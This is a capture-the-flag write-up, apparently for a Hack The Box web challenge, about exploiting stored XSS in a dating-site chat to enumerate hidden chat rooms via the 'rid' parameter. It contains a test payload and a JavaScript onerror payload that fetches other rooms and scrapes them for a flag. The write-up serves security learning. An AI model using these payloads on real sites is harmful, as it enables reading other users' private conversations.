---

````markdown
# OnlyHacks – Stored XSS → Chat Room Enumeration

## 🧩 Challenge Overview

The application is a dating-style web platform featuring:
- User registration
- Dashboard (swipe interface)
- Real-time chat system

During testing, a **Stored Cross-Site Scripting (XSS)** vulnerability was discovered in the chat functionality.

---

## 🔎 Vulnerability Discovery

A test message containing:

```html
<img src=x onerror=alert(1)>
````

was stored and later executed when rendered in the chat interface.

This confirmed:

* The application stores user input without proper sanitization.
* Messages are rendered using `innerHTML`.
* JavaScript executes in the victim’s browser context.

---

## 🧠 Application Logic Analysis

Chat rooms are referenced via:

```
/chat/?rid=<room_id>
```

The frontend code revealed the use of the `rid` parameter to load conversation history.

This indicated the potential for:

* IDOR (Insecure Direct Object Reference)
* Hidden or privileged chat rooms

---

### Final Payload

```html
<img src=x onerror="
for(let i=1;i<20;i++){
  fetch('/chat/?rid='+i)
  .then(r=>r.text())
  .then(t=>{
    if(t.includes('HTB')){
      alert('RID '+i+': '+t.match(/HTB\{.*?\}/))
    }
  })
}
">
```

### What This Does

* Iterates through possible chat room IDs
* Fetches each conversation
* Searches for `HTB{...}` pattern
* Alerts flag immediately when found

---

## 🏁 Result

A hidden chat room accessible to a privileged user contained the flag:

```
HTB{REDACTED}
```

---

